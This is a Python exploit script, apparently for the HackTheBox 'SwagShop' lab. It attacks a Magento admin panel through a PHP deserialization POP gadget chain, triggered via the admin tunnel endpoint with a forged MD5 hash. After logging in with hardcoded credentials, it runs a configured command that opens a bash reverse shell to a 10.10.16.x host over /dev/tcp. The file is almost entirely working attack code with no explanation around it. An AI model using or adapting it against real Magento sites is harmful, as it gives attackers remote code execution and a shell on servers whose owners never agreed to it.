#!/usr/bin/env python3
import requests
import re
import base64
from hashlib import md5
import sys

# ================== CONFIG ==================
target = "http://swagshop.htb/index.php/admin"
username = "forme"
password = "forme"
install_date = "Wed, 08 May 2019 07:23:09 +0000"   # from local.xml
command = "bash -c 'bash -i >& /dev/tcp/10.10.16.187/8080 0>&1'"                                      # change this later
# ============================================

php_function = "system"

# POP gadget
payload = (
    'O:8:"Zend_Log":1:{s:11:"\x00*\x00_writers";a:2:{i:0;O:20:"Zend_Log_Writer_Mail":4:{s:16:'
    '"\x00*\x00_eventsToMail";a:3:{i:0;s:11:"EXTERMINATE";i:1;s:12:"EXTERMINATE!";i:2;s:15:"'
    'EXTERMINATE!!!!";}s:22:"\x00*\x00_subjectPrependText";N;s:10:"\x00*\x00_layout";O:23:"'
    'Zend_Config_Writer_Yaml":3:{s:15:"\x00*\x00_yamlEncoder";s:%d:"%s";s:17:"\x00*\x00'
    '_loadedSection";N;s:10:"\x00*\x00_config";O:13:"Varien_Object":1:{s:8:"\x00*\x00_data"'
    ';s:%d:"%s";}}s:8:"\x00*\x00_mail";O:9:"Zend_Mail":0:{}}i:1;i:2;}}'
) % (len(php_function), php_function, len(command), command)

s = requests.Session()

# 1. Get login page + form_key
r = s.get(target)
form_key = re.search(r'name="form_key" type="hidden" value="(.*?)"', r.text).group(1)

# 2. Login
login_data = {
    "form_key": form_key,
    "login[username]": username,
    "login[password]": password
}
r = s.post(target, data=login_data)

if "Dashboard" not in r.text and "Log Out" not in r.text:
    print("[-] Login failed")
    sys.exit(1)

print("[+] Logged in successfully")

# 3. Get the tunnel URL
r = s.get(target)
ajax_url = re.search(r"ajaxBlockUrl = '(.*?)'", r.text).group(1)
form_key = re.search(r"var FORM_KEY = '(.*?)'", r.text).group(1)

r = s.post(ajax_url + "block/tab_orders/period/7d/?isAjax=true",
           data={"isAjax": "false", "form_key": form_key})

tunnel = re.search(r'src="(.*?)\?ga=', r.text).group(1)

# 4. Build and fire the payload
payload_b64 = base64.b64encode(payload.encode()).decode()
gh = md5((payload_b64 + install_date).encode()).hexdigest()

exploit_url = f"{tunnel}?ga={payload_b64}&h={gh}"

print(f"[+] Sending payload → {command}")
r = s.get(exploit_url)

print(r.text)
